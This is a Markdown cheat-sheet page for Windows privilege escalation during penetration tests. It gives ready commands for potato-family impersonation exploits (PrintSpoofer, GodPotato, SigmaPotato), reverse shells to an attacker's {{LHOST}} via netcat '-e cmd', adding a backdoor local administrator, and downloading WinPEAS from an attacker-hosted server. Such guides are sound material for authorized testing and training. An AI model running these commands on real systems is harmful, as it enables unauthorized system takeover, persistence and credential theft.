---
title: Windows privilege escalation
order: 1
tags: [windows, privesc, privileges, services, winpeas, acl]
---

## Situational awareness

```cmd
systeminfo
```

Record OS/build, architecture and host/domain context. [Microsoft systeminfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

## Token privileges

```cmd
whoami /all
```

Record current identity, groups and token privileges. A listed privilege alone does not prove an available escalation. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami).

## Impersonation escalation

When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled — common for service accounts such as `iis apppool\defaultapppool` or `nt authority\network service` — escalate with the potato family. Upload the binary from an Evil-WinRM session, then run it on the target:

```powershell
upload PrintSpoofer64.exe
upload GodPotato.exe
```

Match the binary to the target architecture and build; one failure does not rule out the others. Verify the result reports `nt authority\system`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [GodPotato](https://github.com/BeichenDream/GodPotato), [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).

## PrintSpoofer

`-i` starts the command on a new interactive console; without it the command runs non-interactively and output returns to the current shell:

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -c "cmd /c .\reverse.exe"
```

For a reverse shell, point `-c` at a prepared [Windows payload](shells/shells#windows-reverse-payload) or netcat and catch it on the [listener](shells/shells#listeners). [PrintSpoofer usage](https://github.com/itm4n/PrintSpoofer#usage).

## GodPotato

Run one command as SYSTEM, or chain a shell:

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c .\nc.exe {{LHOST}} {{LPORT}} -e cmd"
```

Quote the whole `-cmd` value; nested quotes break the call. [GodPotato](https://github.com/BeichenDream/GodPotato).

## SigmaPotato

A current all-in-one binary; hand it a command or ask for a reverse shell:

```powershell
.\SigmaPotato.exe "cmd /c whoami"
.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
```

[SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).

## Create a local administrator

From SYSTEM or an administrator session, mint a new local admin — or promote the account you already own by skipping the first line:

```powershell
net user '{{USER}}' '{{PASS}}' /add
net localgroup administrators '{{USER}}' /add
```

Group membership refreshes only on a new logon; reconnect WinRM afterwards. A local admin enables clean [remote dumping](active-directory/credential-dumping#secretsdump-remotely) and [pass-the-hash](active-directory/credential-access#pass-the-hash) reuse. [Microsoft net user](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user), [net localgroup](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup).

## Automated enumeration

- [ ] Choose the x64 binary only for an x64 target with a compatible .NET runtime.
- [ ] Host on Kali and download from target PowerShell using the commands below.
- [ ] [Verify the transferred file](shells/file-transfers#verify-a-transferred-file), then review its findings.
- [ ] Confirm permissions on each proposed path manually.

The C# build requires .NET 4.5.2 or newer. [WinPEAS requirements](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md).

### Host WinPEAS on Kali

Run on Kali. Set LPORT to a free HTTP server port, such as 8000. Keep the server running.

```bash
cd /home/kali/tools/binaries
python3 -m http.server {{LPORT}}
```

TODO: verify the local package path if that directory or winPEASx64.exe is missing.

### Download WinPEAS in PowerShell

Run in the target's PowerShell session, in a writable directory. LHOST is Kali's IP reachable from the target's subnet.

```powershell
iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
```

This uses HTTP for the file transfer, including from an existing Evil-WinRM shell. [PowerShell download options](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1).

### Run WinPEAS

After verifying the downloaded file, run on the target:

```powershell
.\winPEASx64.exe
```

## Service paths and accounts

Run locally in Windows PowerShell:

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,StartName,PathName,State
```

Check the service account, executable path, arguments and ability to trigger execution. [CIM query](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7.5), [service properties](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service).

## File and directory ACLs

Replace .\tool.exe with the discovered task/service executable, then check its containing directory too.

```cmd
icacls ".\tool.exe"
```

A writable file matters only if a more privileged context uses it. An unquoted service path also needs a viable writable search location and execution trigger. [icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls), [unquoted path conditions](https://attack.mitre.org/techniques/T1574/009/).

## Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

Record task identity, action and trigger; check the action's file and directory ACLs. [Microsoft query options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query).

## Privileged group and host-specific leads

Use whoami /all and the local evidence before selecting a technique:

- [ ] Server Operators: identify a controllable service, executable and restart capability.
- [ ] DnsAdmins: verify the DNS service context and whether a plugin can be loaded; this normally applies to a DC running DNS.
- [ ] Backup Operators or SeBackupPrivilege: look for readable SAM/SYSTEM hives and a viable ntds.dit backup path.
- [ ] SeLoadDriverPrivilege: a usable signed vulnerable driver and compatible OS build are separate prerequisites.
- [ ] Service accounts: check enabled SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege before choosing a potato variant.

PrintNightmare and ZeroLogon are patch/build-specific checks, not default AD steps. Do not run them without matching version evidence and an authorized objective. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami), [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview).
